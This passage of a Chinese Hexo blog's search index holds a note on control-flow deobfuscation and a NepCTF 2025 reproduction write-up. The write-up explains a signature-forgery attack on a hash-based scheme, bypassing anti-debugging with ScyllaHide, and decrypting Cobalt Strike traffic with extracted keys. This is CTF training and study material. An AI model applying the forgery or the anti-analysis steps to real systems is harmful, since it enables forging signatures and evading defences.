data-hmacdigest="043373193a10acc497cd0daff312b5250f6c89e553fcfd56c9e5053bcaa5e0ea">7c4bd356602db2228a945912e2438dcb337bdf4ab766943d3075316556b125fefc645f51eaa98be0d306def52e0a4980517edeae4ba5c80d58bb3571f021dbe28e2c5933917621a96e583db1b2cb7c2cb121acc3ce230d3bd551552ad0d3a7d432502deb3de541ef0c9c1da3bdfa2529e67b747c5d08ea8697d0161d225bed0658d5fdee5e7b1edfcd5e0cb61d3937440beeb9af2d16b53d21231f01060ac547c8bf23c832aeece54f56bdcd489b31cc2998115aaaeae2f01f6f086a7e84128d1afeaba16c96fcf050267fac8f10e6cac28242a69a33287cc14f7c9925c87998398d9bfd70b426824df3f93c7e0ed80c2b946aebfbe98ec784b96aa1c31d39b8bffa8579350f3731cae3b02c2d4977984adefd671dbb6b437573cbe2f81939439870f5aef8e3b990637d49679a218b888375e08ccdbbde71f98916969b5e4493087076192d3efe7204937685ef0e4a739080a91cdd21ef44cf20c7e86c9ec0e027f66882ef4906a3e2ca47d89e4bef9674aaec64b5caffd3bdd78b15724615df895a5aae7a2051648cdc687dfa81ead02ad49d2bc45e4fdbafe88853982d5ce4cfede746eed461789d0551d4f0c89571c2de36eaedface33e4e307cf434c4500ac584f44cc98cbd27b55c56178c34e6ff9cb849687b0c782c1efa9d1c5263f6f22827718e9f5df7406a717d2d68dc2bc2129c09f5dd95f50852d3d1b65ea798f1a8c9288a4323df5ad71b8398e95b58ada4e3994d81264bee8006b7ae2abb96c98061c6a01c5fc283ed36451f6f31db8cc3b0ff115ce1fef3be4c0282ce36356e4063d8bab1bf017308c68230ceed355ed0524e42b319c1a17d2f7f40c1ca080dde85d0879147c9e1c38513110b7138990de8f4fc9c3f3d8f4808894d34674f787d8694e87c4794af6ac2d71a9fd81076e3441d8def7cd5c5449236022aacab6bcb00b55817d921bfe3bfc343c4c7a7c396bc2585a72a545afe9d8ebc02e7b6403ea53651adca2e36e5753dba847c7d48cb9242a8839692029392e48b48837bf0235c587c47b75c89be50eed5c458e43588f0b5806f6b3b95d30cc78670709d8233cbdce595c989473caf2f68b5adced76edc3f9cb6420b44fd9a4531bc224b43d37e5e01d6082315a2f69fd6e15f447556d799c42a13963eebad01cbac430f52ee19a05d0ac7eadf3c5bf0ffb6ea6501aca8df4a7cc1d0fcb6bdfda8736c7b3e91fffca9eb527bb8a07dd1ffb35d2d3e42ceaa828db26e93bd1b5177c34cbd2deb5bc2bb4dd51bfa75fab5f7a7ea3aaef5b7cb5c9f95211de300674749b7cd7d9889be880439357f50803f3a38697fe69185952758a8a031255d0281cc79359a421b67abb7769a3a08e92dcf492152af3aa8e04ddac2dcbabf11541bbabe0d2c2c12b895ac8e7d8f97365289c5652436785c7cb8d4ae59b5f512e6b79d8cc04d2e20ca65a028cddf981e9d9c440107180e76a86e34026228d549ae3efe29e8ac5a49b28b9c4025e8d0923f3573bb569c777828d0f9108d7bf60e5aa0d920cbea448e9a6e28c614da99fc9eacffbc90d1ecf23c2735977b8329942fc4f424d927720ad2a78b525239730126fbddf91c58059c90630025ba8683397ed41d04cffb65e6e8a1b79bd97a7213d5d6b8faeb64a8234b068be95f9fd978c5fe5f824b4fcba8a3497c367387c5bd3243f4a118a9ded712ad6f91c2f1a34d1ad8601343c75f21d8dc831d555ff9e1531ec5804dab8e657a677aeade755d42240803bf976fa3bada33d0aabab6e21d22de43ab7a7aa6606742adc8128f7fbfaf467a3aabab4e73a6d41735d1d0ba9b3cd3b74dbee271b63c9666cb439af20f9758af21ce73f19963da3e61edf7235b4efabd78c276ae6e25c20813d5ccf257b4cbea3121c2258a4674d1f8f9e7b6057e83ebac1d872ec0addaf09ec19dd01d29b3bc7bcf0a7b760e24431154daa1f4a04d14693595b44210a31f58205dab29e69e79483e0b46a8f4ff791fa23b790cc19a97b4cf51e3ddcfc1a159ad7db34ee0071ac3790fa17debb13edc61c48e0df37c537c4860544c41f7ec44a5cec11900a25103e48c808adc12006ca3dceb09cd1bc8a99d585077334187ae58878d8999acdd4860933dfc3d7010104432cfdc16493968a17df865f125d5c29cf7dde4f6a55eb1ba8408b1b0432ad8869df380ff42e22f0dd3d9aaa46c939981148b15b59cefc7da0690db1f7d2cbed1de66d2b7582947eda433317bfd858a6ab4c30c98f49f8f68640faa18a569e9546fdb6cf4b5612af9cc65eeb2961c7d3e2cb3d0b07f089d6d34d1cf7c4a00a792f9528d118d786ba1f0fd2323428f2d51aa32aa339da63fde42ccd9b8c170d2cf6b0560bd8907258373eccabaaf701261192336bfa1a06af09a75cf305dd824562583365dcb2fee0d00f8f56c316e4d1b2492ed682cf34942b34647ff8149ba630b72d68c6ea9fc054252881538a938f0ff3ff82886ada6f0516e1aa9339f509dabe0a5a66249c69b7ce888ce094feb7c133251aef094cf9089c5f5d7e9a933211253f4ca2471647fff1e345ce73100445ec99d0f65258d7e69891ce037238034888ae9635b40137a630f3469d0ea4e4860330b71016511417870b140a8bb30b8a52e84a35db79ff6da777bc582ebe6fbf8c044a57995212bb9512b5c7ec4d195d3c568bb5ab4b6ea7f0527de038e421b09c0800f49e4579789a60b3fe52a48506990049e58fa66f256e63f178b435a1d1378d3d17448657abb92882ccde243c3074517b339af05514c5cd0a2a52710f6ea9bf0acd08bd3be4e4b2fc74e2493ffa9f5d7d3b396596f0027e07ec6d1b8aa564fc303195e195c20531c2b5e90177980375203c7edf408a03091df8596d8bca1b355b3cb2430ed33c85ad6bde847edd64e57317eb40e47c913aaff619f4bf7fd3ae6dba9160c06fd11becb1b538f6b1d9abbf098ed4e36c86decd189cf1cf3d19b303ec1873ef023e8d9d068df71aa543effa121c6199eee2aeda8b260547d51b6be98a4e1179dfa0d4c515ff5d69de2db8a4583668a2a33e482071b53900ff042d82e9b1bf5645c2c2dfa41dcd2402a82978995e81e5796d9a3ebf1fadd5c0a5f18b06ececc7424399f80958b2850a086ce50dbac438917f4afeb6c484976900f3fa806b20d6be185c2343895c0822788de04be729c5f90f7e3e4b3f484cbb0a2c1f71b1458e7ff5a2379e0441584c2f54904f52774978b4b8890f3565009412ca43d027e4b8a34e178372a932e523c581f072df76393c64727bdaa2b73b578fba219d8bbc22363e08c72ed8885ed523d5cc16e8351e3da45938bdf87c55fdf00d470259f753db1d000660f487e0a1590e8fbcb6492b9ea516e99a0db43b77623b7f0c8ee44a82b6e9d43687181b668f14087eca206d19f4faa44a4bbc5c37303fd3b53c017f6f31830df9f3584adbd4f164a8acc7382dfe2a76b6b5e01e49730dd64d9969d6a39f27bfdb91532f6dbfc736666cac3d4fdc89fb7178b60295947f5d037c30080d298147bda668828537792e269af9b6582df9a9bf711361c9ca62ce58996dc3e426ebb3698e121d2cb15079fd3d6ae068e4fafcfb612a5c8f00abf67117845035dbb43ab4cfdc2084a70dee7187c58338d919699d3f04219e4f7e1a3ec6ab820b0c915bb597962e2bf94fe46a38b0db879594ab10412f3f6110df5017e792996e83f8f452051b3ec72755c4489fabc79b1af0d06027918ce86fef11ec7c54103ec2a4b6bf64f2c3550d9c20ed248bee7874882bfe51b59c31fb25842370af695955f00b8d2732887adca178a54f5acc6020d8b5bca9f401e508225ac10c5355f010c3b9335fa93b1cbf8a1e4142adac0fcf8e677b0f9b255363c3b94ad86cc2e55f7080c95bfbb11533237b7b6c033236200f0b167eb970b214992b0986b6f1046aba6b7442c9cc6f8686b89dc96d646a3bb36d20b96c150dd272ea666174d736eb909aad943b113ddeaf28b4057b102218a77de54c4ac9aba0dc90cb0a8b526dfc75a248e4b9d8ec0f56fb59a5a6a5b33fb97b6e794a7aae54ec17f6474220fb04a9befc1aeddc7d9ff64630d57995f2969449118f9fcaa1f77288bd49f5a4696b597fc396579b763ecf4dfeecab121653106e4986cc39cdaead07045c335246578ec3600e576cc39511383a1e5e663dc4f0d5218d55169a16a1988b8d5f4b7f134de537224bc5ed1f87aff90af6a74205c078e4e6da42f9aa1dd4d123b5d78b9a0f3a1049ff76789c493ab2dd122c40f30da3fdcd6f9d025d64408d2b2f4df73a07fa50b53b1e63a174b12d12411a7bbd9529e71769c7907589b4a8be5df4d8c155502656f12ac8349529082d565abc2ec2e9e22a0568aff8493c77dd0673acf85ac3fd035a5364dc09b26fa5a0c7d23ae1fc1069314591b7521429fe32da656f7130731bdf0b8343c2fbef5973530d263308b931102f8e48d157c5019f9a9d8a8be6ef6a97b5b6baee744d58c06fce8428e9a5b4e618046126bb019c398d73</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>控制流平坦化</title>
      <link href="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/"/>
      <url>/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>之前安装对抗控制流平坦化的工具deflat.py但失败，今天成功了😃</p><p>控制流平坦化是一种代码混淆技术，就是让流程图平坦、扁平源码，把清晰的逻辑变得很难看懂</p><p><img src="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/image-20230409164158635.png" alt="image-20230409164158635"></p><p>原理讲解：<a href="https://bbs.kanxue.com/thread-284242.htm">https://bbs.kanxue.com/thread-284242.htm</a></p><p>去平坦化环境安装</p><p>windows环境</p><p>pip install angr</p><p><a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p><p>运行python deflat.py -f test –addr main函数地址</p><p><img src="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/image-20250803211248453.png" alt="image-20250803211248453"></p><p>未混淆的可执行文件</p><p><img src="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/image-20250803224034898.png" alt="image-20250803224034898"></p><p>平坦化的可执行文件</p><p><img src="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/image-20250803224123481.png" alt="image-20250803224123481"></p><p>去平坦化的可执行文件</p><p><img src="/2025/08/03/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/image-20250803224332994.png" alt="image-20250803224332994"></p><p>程序逻辑清晰了很多</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nepctf2025</title>
      <link href="/2025/08/01/Nepctf2025/"/>
      <url>/2025/08/01/Nepctf2025/</url>
      
        <content type="html"><![CDATA[<p>比赛进行的两天还在外地，这几天打算做一遍题目，题目很好啊，可惜我好菜😶</p><p>复现复现复现</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Nepsign"><a href="#Nepsign" class="headerlink" title="Nepsign"></a>Nepsign</h2><p>sm3参考链接：<a href="https://blog.csdn.net/qq_40662424/article/details/121637732">https://blog.csdn.net/qq_40662424/article/details/121637732</a></p><p>SM3是一种由中国国家密码管理局公布的商用密码杂凑算法，与SHA-256安全相当，四个步骤：消息填充、消息扩展、迭代压缩、输出结果。消息分组长度为512位，摘要长度为256位</p><p>分析server.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)</span><br><span class="line">    <span class="keyword">return</span> h</span><br></pre></td></tr></table></figure><p>用于计算输入数据的 SM3 哈希值 的 Python 函数，基于gmssl库</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br></pre></td></tr></table></figure><p><code>SM3_n</code> 是一个 迭代哈希计算函数，它对输入数据进行n次 SM3 哈希运算，并最终返回指定位数的哈希值</p><p>Nepsign类</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Nepsign</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.n = <span class="number">256</span></span><br><span class="line">        self.hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span> <span class="comment"># 16进制字符集</span></span><br><span class="line">        self.keygen() <span class="comment"># 生成密钥对</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">self</span>):</span><br><span class="line">        rng = SystemRandom()</span><br><span class="line">        self.sk = [rng.randbytes(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">        self.pk = [SM3_n(self.sk[_], <span class="number">255</span>, self.n) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">        <span class="keyword">return</span> self.sk, self.pk</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, msg, sk=<span class="literal">None</span></span>):</span><br><span class="line">        sk = sk <span class="keyword">if</span> sk <span class="keyword">else</span> self.sk</span><br><span class="line">        m = SM3(msg)</span><br><span class="line">        m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">        a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n // <span class="number">8</span>)]</span><br><span class="line">        step = [<span class="number">0</span>] * <span class="number">48</span>;</span><br><span class="line">        qq = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            step[i] = a[i]</span><br><span class="line">            qq[i] = SM3_n(sk[i], step[i])</span><br><span class="line">        <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                <span class="keyword">if</span> m[j - <span class="number">1</span>] == self.hex_symbols[i]:</span><br><span class="line">                    <span class="built_in">sum</span>[i] += j</span><br><span class="line">            step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">            qq[i + <span class="number">32</span>] = SM3_n(sk[i + <span class="number">32</span>], step[i + <span class="number">32</span>])</span><br><span class="line">        <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> qq]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, msg, qq, pk=<span class="literal">None</span></span>):</span><br><span class="line">        qq = [<span class="built_in">bytes</span>.fromhex(i) <span class="keyword">for</span> i <span class="keyword">in</span> qq]</span><br><span class="line">        pk = pk <span class="keyword">if</span> pk <span class="keyword">else</span> self.pk</span><br><span class="line">        m = SM3(msg)</span><br><span class="line">        m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">        a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n // <span class="number">8</span>)]</span><br><span class="line">        step = [<span class="number">0</span>] * <span class="number">48</span>;</span><br><span class="line">        pk_ = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            step[i] = a[i]</span><br><span class="line">            pk_[i] = SM3_n(qq[i], <span class="number">255</span> - step[i])</span><br><span class="line">        <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                <span class="keyword">if</span> m[j - <span class="number">1</span>] == self.hex_symbols[i]:</span><br><span class="line">                    <span class="built_in">sum</span>[i] += j</span><br><span class="line">            step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">            pk_[i + <span class="number">32</span>] = SM3_n(qq[i + <span class="number">32</span>], <span class="number">255</span> - step[i + <span class="number">32</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> pk_ == pk <span class="keyword">else</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>密钥生成keygen函数：使用随机数生成器生成48个32字节的私钥，对每个私钥进行255次SM3哈希得到公钥</p><p>签名函数sign:计算msg的SM3哈希并转化为256位二进制，将哈希分成32个8位组，前32个签名元素使用消息哈希的每个字节值作为迭代次数对私钥进行哈希，后16个签名元素计算每个十六进制字符在哈希中的位置和，取模255作为迭代次数，返回签名数组</p><p>验证函数verify:对签名进行”补足”哈希(255-step次)，应能得到公钥，比较计算出的公钥和存储的公钥是否一致</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;initializing...&#x27;</span>)</span><br><span class="line">Sign = Nepsign() <span class="comment"># 创建Nepsign实例，自动生成密钥对</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)):</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            msg = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;msg: &#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> msg != <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(Sign.sign(msg))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t do that&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            qq = literal_eval(<span class="built_in">input</span>(<span class="string">&#x27;give me a qq: &#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> Sign.verify(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>, qq):</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>实现了一个交互式的签名验证系统，选项一进行签名功能，但是不能对“happy for NepCTF 2025”签名，选项二验证happy for NepCTF 2025的签名，成功则会得到flag</p><p>看这篇wp的攻击思路：<a href="https://blog.csdn.net/2401_87558262/article/details/149733054">https://blog.csdn.net/2401_87558262/article/details/149733054</a></p><ol><li><strong>目标</strong><br>伪造消息 <code>b&#39;happy for NepCTF 2025&#39;</code> 的签名 <code>qq</code>，使得 <code>verify</code> 验证通过，从而获取flag。</li><li><strong>关键</strong><ul><li>验证时计算：<code>pk_[i] = SM3_n(qq[i], 255 - a[i])</code>，要求 <code>pk_[i] == pk[i]</code></li><li>公钥生成时：<code>pk[i] = SM3_n(sk[i], 255)</code></li><li>若 <code>a[i] = 0</code>，则 <code>qq[i] = sk[i]</code> 时验证必然通过（因为 <code>SM3_n(sk[i], 255) = pk[i]</code>）</li></ul></li><li><strong>攻击路径</strong><ul><li>通过其他消息的签名泄露 <code>sk[i]</code>（当 <code>a[i] = 0</code> 时，<code>qq[i] = sk[i]</code>）</li><li>组合所有 <code>sk[i]</code> 构造目标签名。</li></ul></li></ol><p>compute_steps(msg)计算目标消息的hash参数a[i]和sum[i]</p><p>collect_secrets(conn, msg_target, step_target)大量发送随机消息，找到满足a[i]&#x3D;0的消息，此时该消息的签名 qq[i] 就是 sk[i]（因为 SM3_n(sk[i], 0) &#x3D; sk[i]），重复直到找到48个sk[i]</p><p>forge_signature(secret_keys, step_ref)伪造目标签名，对每个 <code>sk[i]</code> 计算 <code>SM3_n(sk[i], a_target[i])</code>，得到目标签名 <code>qq[i]</code>。验证时SM3_n(qq[i], 255 - a_target[i]) &#x3D; SM3_n(sk[i], 255) &#x3D; pk[i]，必然通过。</p><p>ps:<a href="https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP/%E8%BF%99%E9%87%8C%E6%98%AF%E5%AF%86%E7%A0%81%E5%AD%A6%E5%85%A8%E9%83%A8%E7%9A%84wp">https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP/这里是密码学全部的wp</a>(tql😮,看到这道题很棒的思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">签名由48个哈希值组成，当私钥相同时，每个位置的哈希值只与当前位置和step[i]有关，step[i]由签名的消息确定。所以先求出happy for NepCTF 2025的step，然后随机选取一些消息发送给服务器，从返回的签名中拿到(i,step[i])对应的哈希值，需要的签名都拿到后，发给服务器就行。</span><br><span class="line">----出自FariTree的wp</span><br></pre></td></tr></table></figure><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="realme"><a href="#realme" class="headerlink" title="realme"></a>realme</h2><p>根据<a href="https://tkazer.github.io/2025/07/28/NepCTF2025/">Liv师傅的wp</a>复现</p><p>反调试没怎么做过，认识了scyllahide插件(也许该系统学一下🤔</p><p><img src="/2025/08/01/Nepctf2025/image-20250802103527546.png" alt="image-20250802103527546"></p><p>在main函数下面发现了sub_401A60,是一个rc4加密的变形函数，但是没有被调用，应该有反调试，使用Scyllahide插件一键过反调试，动调断点该处代码，发现被调用</p><p>有点问题…😣</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="客服小美"><a href="#客服小美" class="headerlink" title="客服小美"></a>客服小美</h2><p>根据<a href="https://dwd.moe/post/nepctf-2025%E5%A4%8D%E7%8E%B0">https://dwd.moe/post/nepctf-2025复现</a></p><p>vol2教程<a href="https://blog.csdn.net/m0_68012373/article/details/127419463">https://blog.csdn.net/m0_68012373/article/details/127419463</a></p><p><img src="/2025/08/01/Nepctf2025/image-20250803094605757.png" alt="image-20250803094605757"></p><p>得到内存镜像的操作系统Win10x64_19041</p><p>查看内存进程，发现可疑进程</p><p><img src="/2025/08/01/Nepctf2025/image-20250803095241245.png" alt="image-20250803095241245"></p><p>把这个进程dump出来6492.dmp</p><p>分析流量，筛选出http流量</p><p><img src="/2025/08/01/Nepctf2025/image-20250803102935913.png" alt="image-20250803102935913"></p><p><img src="/2025/08/01/Nepctf2025/image-20250803103016222.png" alt="image-20250803103016222"></p><p>其实这里可以看出通信的ip和端口</p><p>CS流量解密可以看一篇博客<a href="https://blog.csdn.net/AomCC/article/details/133298604">https://blog.csdn.net/AomCC/article/details/133298604</a></p><p>这里我直接用 <code>cs-extract-key.py</code> 尝试提取密钥</p><p><img src="/2025/08/01/Nepctf2025/image-20250803104104121.png" alt="image-20250803104104121"></p><p>通过提取的密钥解密</p><p> python cs-parse-traffic.py -k 35d34ac8778482751682514436d71e09:a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7 .&#x2F;DESKTOP.pcapng</p><p>发现了用户名JohnDoe</p><p><img src="/2025/08/01/Nepctf2025/image-20250803104529272.png" alt="image-20250803104529272"></p><p>发现了secret.txt</p><p><img src="/2025/08/01/Nepctf2025/image-20250803104625879.png" alt="image-20250803104625879"></p><p>得到了flag NepCTF{JohnDoe_192.168.27.132:12580_5c1eb2c4-0b85-491f-8d50-4e965b9d8a43}</p><p>未完待续</p><p>参考的好多wp🤩(真强啊</p><p><a href="https://blog.csdn.net/2401_87558262/article/details/149733054">https://blog.csdn.net/2401_87558262/article/details/149733054</a></p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/19007988">https://www.cnblogs.com/LAMENTXU/articles/19007988</a></p><p><a href="https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP/">https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP/</a></p><p><a href="https://tkazer.github.io/2025/07/28/NepCTF2025/">https://tkazer.github.io/2025/07/28/NepCTF2025/</a></p><p><a href="https://2hi5hu.cn/archives/nepctf2025">https://2hi5hu.cn/archives/nepctf2025</a></p><p><a href="https://dwd.moe/post/nepctf-2025">https://dwd.moe/post/nepctf-2025</a></p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Re的记录</title>
      <link href="/2025/07/19/Re%E7%9A%84%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/07/19/Re%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="555db9fa8e117affd6031a46632729ae5de0561dd57e0672dcd7c459cf2adb5d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>以后</title>
      <link href="/2025/07/16/%E4%BB%A5%E5%90%8E/"/>
      <url>/2025/07/16/%E4%BB%A5%E5%90%8E/</url>
      
